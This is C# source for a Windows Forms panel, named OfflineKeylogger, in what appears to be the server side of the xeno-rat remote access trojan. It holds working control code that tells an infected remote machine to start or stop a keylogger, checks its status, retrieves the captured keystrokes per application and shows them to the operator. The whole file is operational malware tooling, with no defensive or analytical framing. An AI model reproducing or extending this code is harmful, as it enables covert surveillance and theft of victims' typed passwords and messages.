using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class OfflineKeylogger : Form
    {
        Node client;
        bool started = false;
        Dictionary<string, string> applications = new Dictionary<string, string>();
        public OfflineKeylogger(Node _client)
        {
            client = _client;
            client.AddTempOnDisconnect(OnTempDisconnect);
            InitializeComponent();
            InitializeAsync();
        }

        private void OnTempDisconnect(Node node) 
        {
            if (this.IsDisposed) return;
            MessageBox.Show("Socket closed!");
            try
            {
                this.BeginInvoke((MethodInvoker)(() =>
                {
                    this.Close();
                }));
            }
            catch { }
            
        }

        private async Task<bool> IsStarted() 
        {
            await client.SendAsync(new byte[] { 0 });
            byte[] data = await client.ReceiveAsync();
            if (data == null || data.Length != 1) 
            {
                client.Disconnect();
                return false;
            }
            return data[0] == 1;
        }

        private async Task InitializeAsync() 
        {
            byte[] data=await client.ReceiveAsync();
            if (data == null||data.Length!=1||data[0]!=1) 
            {
                if (this.IsDisposed) return;
                MessageBox.Show("There was an error!");
                try
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {

                        this.Close();
                    }));
                }
                catch { }
                
            }
            await UpdateStatus();
        }

        private async Task StartKeylogger() 
        {
            await client.SendAsync(new byte[] { 1 });
        }

        private async Task StopKeylogger()
        {
            await client.SendAsync(new byte[] { 2 });
        }

        private async Task<Dictionary<string, string>> GetKeylogs() 
        {
            Dictionary<string, string> retval = new Dictionary<string, string>() { };
            await client.SendAsync(new byte[] { 3 });
            byte[] data = await client.ReceiveAsync();
            if (data == null)
            {
                client.Disconnect();
                return retval;
            }
            try 
            {
                return ConvertBytesToDictionary(data, 0);
            } 
            catch 
            {
                return retval;
            }
        }

        private async Task UpdateStatus() 
        {
            started = await IsStarted();
            label3.BeginInvoke((MethodInvoker)(() =>
            {
                label3.Text = "Status: " + started.ToString();
            }));
            
        }
        public string Normalize(string input)
        {
            return input.Replace("[enter]", Environment.NewLine).Replace("[space]", " ");
        }

        private static Dictionary<string, string> ConvertBytesToDictionary(byte[] data, int offset)
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            string currentKey = null;
            StringBuilder currentValue = new StringBuilder();

            for (int i = offset; i < data.Length; i++)
            {
                byte currentByte = data[i];

                if (currentByte == 0)
                {
                    // Null terminator indicates the end of a key or a value
                    if (currentKey == null)
                    {
                        currentKey = currentValue.ToString(); // Use ToString to get the string
                        currentValue.Clear();
                    }
                    else
                    {
                        dictionary[currentKey] = currentValue.ToString(); // Use ToString to get the string
                        currentKey = null;
                        currentValue.Clear();
                    }
                }
                else
                {
                    currentValue.Append((char)currentByte);
                }
            }

            return dictionary;
        }


        private void OfflineKeylogger_Load(object sender, EventArgs e)
        {

        }

        private void listView1_ItemActivate(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string firstColumnText = listView1.SelectedItems[0].SubItems[0].Text;
                textBox1.Text = Normalize(applications[firstColumnText]);
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await StartKeylogger();
            await UpdateStatus();
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            await StopKeylogger();
            await UpdateStatus();
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            await UpdateStatus();
            Dictionary<string,string> data=await GetKeylogs();
            if (data.Count == 0) 
            {
                return;
            }
            applications = data;
            try
            {
                textBox1.Text = "";
                listView1.BeginInvoke((MethodInvoker)(() =>
                {
                    listView1.Items.Clear();
                    foreach (string i in applications.Keys)
                    {
                        listView1.Items.Add(new ListViewItem(i));
                    }
                }));
            }
            catch { }

        }
    }
}
